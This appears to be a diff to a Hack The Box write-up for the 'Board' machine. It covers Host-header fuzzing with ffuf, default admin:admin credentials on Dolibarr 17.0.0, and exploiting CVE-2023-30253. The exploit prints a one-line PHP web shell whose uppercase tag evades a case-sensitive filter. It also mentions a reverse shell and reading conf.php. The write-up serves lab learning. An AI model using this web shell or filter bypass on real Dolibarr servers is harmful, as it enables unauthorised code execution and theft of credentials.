@@ -31,14 +31,18 @@ ffuf -u http://board.htb -H 'Host: FUZZ.board.htb' -w subdomains.txt -fs 15949
 80/tcp open  http  Apache
 ```
 
+`crm.board.htb` only shows up when fuzzing the `Host` header. It runs **Dolibarr 17.0.0** (footer and `?version=` on static assets) with factory `admin:admin`.
+
 ## Access
 
 1. **Dolibarr 17.0.0** at `http://crm.board.htb` with `admin:admin`.
-2. **CVE-2023-30253**: create a website page containing PHP in the editor and preview it; the code runs.
+2. **CVE-2023-30253**: the website module filter blocks `<?php` but is case-sensitive, so `<?PHP` slips through; create the page and preview it.
 
 ```php
-<?php system($_GET['c']); ?>
+<?PHP system($_GET['c']); ?>
 ```
+
+The CVE affects Dolibarr **< 17.0.1** and its fix normalises the tag; the vector is the website editor, not a plugin.
 
 3. Reverse shell as `www-data`, then read `conf.php`:
 
